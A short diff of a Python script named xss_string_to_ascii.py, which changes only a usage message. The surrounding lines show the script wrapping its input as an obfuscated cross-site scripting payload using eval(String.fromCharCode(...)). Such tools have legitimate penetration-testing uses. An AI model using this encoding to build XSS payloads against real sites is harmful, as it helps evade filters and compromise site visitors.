@@ -14,7 +14,7 @@ def stringToAscii(stringToConvert):
     print("<script>eval(String.fromCharCode(" + catString + "))</script>")
 
 if len(sys.argv) != 2:
-    print("Example usage: python3 xss_string_to_ascii.py string_value\nEnsure you use quotes or escape special characters")
+    print("Example usage: python3 xss_string_to_ascii.py string_value")
     sys.exit
 else:
     stringToAscii(sys.argv[1])
